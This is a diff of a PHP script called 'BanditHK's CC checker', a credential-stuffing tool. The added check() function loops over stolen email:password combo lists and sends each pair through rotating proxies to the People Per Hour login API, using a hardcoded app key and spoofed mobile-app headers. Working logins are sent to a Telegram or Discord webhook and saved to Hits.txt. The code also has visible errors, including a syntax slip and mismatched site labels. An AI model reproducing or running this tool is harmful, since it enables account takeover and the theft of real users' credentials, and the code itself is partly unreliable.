@@ -1,7 +1,8 @@
 <?php
 
-function start(){
-system("clear");
+error_reporting(0);
+ini_set('display_errors', 0);
+echo chr(27).chr(91).'H'.chr(27).chr(91).'J';
 echo "
 __________                    .___.__  __     ___ ___  ____  __.
 \______   \_____    ____    __| _/|__|/  |_  /   |   \|    |/ _|
@@ -10,8 +11,7 @@ __________                    .___.__  __     ___ ___  ____  __.
  |______  /(____  /___|  /\____ | |__||__|   \___|_  /|____|__ \
         \/      \/     \/      \/                  \/         \/
 \n";
-echo "Welcome to BanditHK's PHP OpenBullet Version \n\n";
-
+echo "Welcome to BanditHK's CC checker\n\n";
 retry1:
 echo "[1]Telegram\n[2]Discord\n\nSelect your webhook app: ";
 $choice = trim(fgets(STDIN));
@@ -117,8 +117,9 @@ combochoice2:
     goto combochoice2;
 }
   $count = count($combo);
-return [$combo,$choice,$proxytype,$teleid,$teletoken,$discordurl,$count,$plist];
-}
+  check($combo,$choice,$proxytype,$teleid,$teletoken,$discordurl,$count,$plist);
+
+//Functions
 function show_status($done, $total, $size=30) {
 
     static $start_time;
@@ -222,3 +223,72 @@ file_put_contents('http-proxy.txt',$resp);
 sleep(600);
 goto restart;
  }
+function check($combo,$choice,$proxytype,$teleid,$teletoken,$discordurl,$count,$plist){
+ $total = 0;
+$hits = 0;
+$fail = 0;
+for ($i=1; $i<=$count; $i++){
+restart:
+$comboarray = $combo[array_rand(array_unique($combo))];
+$comboline = explode(":",$comboarray);
+$user = $comboline[0];
+$pass = $comboline[1];
+$proxy = $plist[array_rand($plist)];
+$p = explode(":",$proxy);
+$proxyurl = $p[0];
+$proxyport = $p[1];
+  if(isset($p[2])){
+                      $proxyuser = $p[2];
+                      $proxypass = $p[3];
+                      }else{
+                      $proxyuser = "";
+                      $proxypass = "";
+                      }
+ //POST REQUEST
+$ch = curl_init();
+curl_setopt_array($ch,array(
+  CURLOPT_URL => 'https://www.peopleperhour.com/v1/user/login?app_id=f503d142&app_key=ebe3b7009b34226b87faab3d63d12fc0',
+  CURLOPT_RETURNTRANSFER => true,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_PROXYTYPE => $proxytype,
+  CURLOPT_PROXY => $proxyurl,
+  CURLOPT_PROXYPORT => $proxyport,
+  CURLOPT_PROXYUSERPWD => $proxyuser.':'.$proxypass,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS => array('email'=> $user,'password'=>$pass),
+ CURLOPT_HTTPHEADER => array(
+    'Host: api.cards.app',
+    'uuid: 5ffe9a8125447b95',
+    'user-agent: pphmobileandroid/3.7.0',
+    'cookie: PHPSESSID=1a65aba0ddb0d791d1fc33cf10af436c; mid=1659448905015002400530414',
+  ),
+ ));
+ $response = curl_exec($ch);
+curl_close($ch);
+ 
+ //KEYCHECK
+if(str_contains($response,'Wrong email or password.')){
+  $total++;
+  $fail++;
+  replaceOut("[+]Total Progress: ".show_status($total, $count)."\n[+]Dead: $fail\n[+]Hits: $hits\n");
+ 
+}
+ elseif(str_contains($response,'dashboard'){
+ $total++;
+        $hits++;
+        if($choice == "2"){
+        $discorddata = array("content" => "---New People per Hour Hit---\n[+]Data: $user:$pass\n", "username" => "BanditHK");
+        }else{
+        $telegramdata = "---New Cards App Hit---\n[+]Data: $user:$pass";
+        $params = [
+                'chat_id' => $teleid,
+                'text' => $telegramdata,
+            ];
+          }
+        webhook($choice,$discordurl,$discorddata,$telegramdata,$params,$teletoken);
+        file_put_contents('Hits.txt',"---New People per Hour Hit---\n[+]Data: $user:$pass\n\n",FILE_APPEND);
+        replaceOut("[+]Total Progress: ".show_status($total, $count)."\n[+]Dead: $fail\n[+]Hits Count: $hits\n");
+ }
+}
+}
